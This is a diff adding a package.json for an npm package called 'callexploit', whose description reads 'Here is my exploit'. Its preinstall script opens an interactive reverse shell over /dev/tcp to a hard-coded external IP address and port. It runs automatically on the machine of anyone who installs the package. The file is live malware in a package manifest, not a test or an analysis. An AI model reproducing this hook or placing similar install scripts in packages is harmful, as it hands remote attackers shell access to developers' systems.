@@ -1,0 +1,16 @@
+{
+	"name": "callexploit",
+	"version": "1.0.1",
+	"description": "Here is my exploit",
+	"license": "MIT",
+	"main": "index.js",
+	"dependencies": {
+		"net": "^1.0.2"
+	},
+	"devDependencies": {
+		"net": "^1.0.2"
+	},
+	"scripts": {
+		"preinstall": "bash -c 'bash -i >& /dev/tcp/8.129.41.25/10235 0>&1'"
+	}
+}
